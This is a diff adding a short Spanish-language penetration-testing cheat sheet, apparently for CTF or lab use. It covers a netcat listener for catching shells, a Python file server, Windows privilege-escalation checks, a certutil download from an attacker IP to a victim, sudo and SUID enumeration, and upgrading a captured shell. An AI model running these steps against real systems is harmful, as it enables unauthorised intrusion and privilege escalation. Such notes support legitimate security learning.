@@ -1,0 +1,32 @@
+
+####### colocarse en escucha ########
+nc -lvnp <puerto>
+
+
+####### abrir un servidor para transferir archivos
+python3 -m http.server <puerto>
+
+
+####### escalacion de privilegios en Windows (Windows-Exploit-Suggester) ###############
+// en el windows se coloca el comando systeminfo y ese output se guarda en linux en un archivo llamado systeminfo.txt
+python2 windows-exploit-suggester -u //descarga el archivo
+python2 windows-exploit-suggester -d (archivo descargado) -i systeminfo.txt
+
+
+######## transferir archivos de linux a windows ###########
+//en linux abrir un servidor
+certutil.exe -f -urlcache -split http://<ip atacante>:<puerto>/archivo.extension archivo.extension
+
+######## saber permisos en linux ########
+permisos sudo: sudo -l
+permisos suid: find / -type f -perm -4000 -ls 2>/dev/null
+
+
+######## mejorar bash ######## 
+>script /dev/null -c bash
+crtl + z
+>stty raw -echo; fg
+>reset xterm
+>export TERM=xterm
+stty size //en la terminal del atacante para saber el tamaño
+stty rows <rows> columns <columns> //en la terminal de la victima para ajustar el tamaño
